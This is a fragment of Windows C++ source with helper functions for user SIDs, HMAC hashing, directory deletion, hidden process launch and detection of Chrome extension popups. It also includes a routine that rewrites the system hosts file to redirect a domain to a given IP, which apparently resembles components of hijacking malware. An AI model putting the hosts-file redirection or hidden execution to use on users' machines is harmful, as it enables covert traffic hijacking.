		_tprintf(_T("GetTokenInformation failed. GetLastError returned: %d\n"),
			GetLastError());

		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}

	std::vector<BYTE> buffer;
	buffer.resize(dwBufferSize);
	PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(&buffer[0]);

	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pTokenUser,
		dwBufferSize,
		&dwBufferSize))
	{
		_tprintf(_T("2 GetTokenInformation failed. GetLastError returned: %d\n"),
			GetLastError());

		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}


	//
	// Check if SID is valid
	//
	if (!IsValidSid(pTokenUser->User.Sid))
	{
		_tprintf(_T("The owner SID is invalid.\n"));
		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}

	if (pTokenUser->User.Sid == NULL)
	{
		return -1;
	}

	LPWSTR pszSID = NULL;
	if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &pszSID))
	{
		return -1;
	}

	wcscpy(szSID, pszSID);

	szSID[wcslen(szSID) - 5] = 0;

	LocalFree(pszSID);
	pszSID = NULL;

	return 0;
}

std::string getHMACSHA256(unsigned char* key, const char* pszBuffer)
{
	unsigned char* digest;

	// Using sha1 hash engine here.
	// You may use other hash engines. e.g EVP_md5(), EVP_sha224, EVP_sha512, etc
	digest = HMAC(EVP_sha256(), key, 64, (const unsigned char*)pszBuffer, strlen(pszBuffer), NULL, NULL);


	char outputBuffer[65];
	int i = 0;
	for (i = 0; i < SHA256_DIGEST_LENGTH; i++)
	{
		sprintf(outputBuffer + (i * 2), "%02X", digest[i]);
	}
	outputBuffer[64] = 0;

	string ret = outputBuffer;

	return ret;
}

bool dirExists(LPCTSTR strPath)
{
	DWORD ftyp = GetFileAttributes(strPath);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}


int DeleteDirectory(const std::wstring& refcstrRootDirectory, bool bDeleteSubdirectories)
{
	bool            bSubdirectory = false;       // Flag, indicating whether
												 // subdirectories have been found
	HANDLE          hFile;                       // Handle to directory
	std::wstring     strFilePath;                 // Filepath
	std::wstring     strPattern;                  // Pattern
	WIN32_FIND_DATAW FileInformation;             // File information


	strPattern = refcstrRootDirectory + L"\\*.*";
	hFile = ::FindFirstFileW(strPattern.c_str(), &FileInformation);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (FileInformation.cFileName[0] != L'.')
			{
				strFilePath.erase();
				strFilePath = refcstrRootDirectory + L"\\" + FileInformation.cFileName;

				if (FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (bDeleteSubdirectories)
					{
						// Delete subdirectory
						int iRC = DeleteDirectory(strFilePath, bDeleteSubdirectories);
						if (iRC)
							return iRC;
					}
					else
						bSubdirectory = true;
				}
				else
				{
					// Set file attributes
					if (::SetFileAttributesW(strFilePath.c_str(),
						FILE_ATTRIBUTE_NORMAL) == FALSE)
						return ::GetLastError();

					// Delete file
					if (::DeleteFileW(strFilePath.c_str()) == FALSE)
						return ::GetLastError();
				}
			}
		} while (::FindNextFileW(hFile, &FileInformation) == TRUE);

		// Close handle
		::FindClose(hFile);

		DWORD dwError = ::GetLastError();
		if (dwError != ERROR_NO_MORE_FILES)
			return dwError;
		else
		{
			if (!bSubdirectory)
			{
				// Set directory attributes
				if (::SetFileAttributesW(refcstrRootDirectory.c_str(),
					FILE_ATTRIBUTE_NORMAL) == FALSE)
					return ::GetLastError();

				// Delete directory
				if (::RemoveDirectoryW(refcstrRootDirectory.c_str()) == FALSE)
					return ::GetLastError();
			}
		}
	}

	return 0;
}

void CreateProcessCommand(char* commandStr)
{
	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_info;
	ZeroMemory(&startup_info, sizeof(startup_info));
	ZeroMemory(&process_info, sizeof(process_info));
	startup_info.cb = sizeof(startup_info);

	BOOL success = CreateProcess(NULL, commandStr, NULL, NULL,
		FALSE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info);

	if (!success) {
		return;
	}

	CloseHandle(process_info.hProcess);
	CloseHandle(process_info.hThread);
}

BOOL is64BitSystem() {
	BOOL isWow64 = FALSE;

	// Check if the process is running under WOW64
	if (IsWow64Process(GetCurrentProcess(), &isWow64))
	{
		// If isWow64 is TRUE, the process is running as a 32-bit application on a 64-bit system
		return (isWow64 == TRUE);
	}

	// Unable to determine the system architecture
	return false;
}

bool isChromeExtensionActive()
{
	bool res = false;
	POINT cursorPos;
	GetCursorPos(&cursorPos);

	HWND windowUnderCursor = WindowFromPoint(cursorPos);

	if (windowUnderCursor != NULL) {
		char className[256];
		GetClassNameA(windowUnderCursor, className, sizeof(className));

		if (strcmp(className, "Chrome_RenderWidgetHostHWND") == 0) {
			if (windowUnderCursor != NULL) {
				RECT windowRect;
				GetWindowRect(windowUnderCursor, &windowRect);

				int width = windowRect.right - windowRect.left;
				int height = windowRect.bottom - windowRect.top;

				if (width <= 500 && height <= 850)
				{
					res = true;
				}
				else
				{
					res = false;
				}
			}

		}
		else {
			res = false;
		}
	}

	return res;
}

void manageHostFile(const std::string& active, const std::string& dns, const std::string& ip)
{
	// Get the system drive from the environment variable
	const char* systemDrive = std::getenv("SystemDrive");
	if (!systemDrive) {
		file_log("Unable to get system drive.");
		return;
	}

	// Construct the path to the hosts file
	std::string filename = std::string(systemDrive) + "\\Windows\\System32\\drivers\\etc\\hosts";

	// Check if the file exists and create it if it doesn't
	if (!std::filesystem::exists(filename)) {
		std::ofstream createFile(filename);
		if (!createFile) {
			file_log("Unable to create file: " + filename);
			return;
		}
		createFile.close();
	}

	// Read the file into a vector of strings
	std::ifstream inFile(filename);
	if (!inFile) {
		file_log("Unable to open file: " + filename);
		return;
	}

	std::vector<std::string> lines;
	std::string line;
	while (std::getline(inFile, line)) {
		lines.push_back(line);
	}
	inFile.close();

	// Remove any lines containing the dns
	lines.erase(std::remove_if(lines.begin(), lines.end(),
		[&dns](const std::string& line) {
			return line.find(dns) != std::string::npos;
		}),
		lines.end());

	// If active is "true", add the new entry
	if (active == "true") {
		std::ostringstream oss;
		oss << ip << " " << dns;
		lines.push_back(oss.str());
	}

	// Write the updated lines back to the file
	std::ofstream outFile(filename);
	if (!outFile) {
		// std::cerr << "Unable to open file for writing: " << filename << std::endl;
		file_log("Unable to open file for writing: " + filename);
		return;
	}

	for (const auto& line : lines) {
		outFile << line << std::endl;
	}

	outFile.close();
}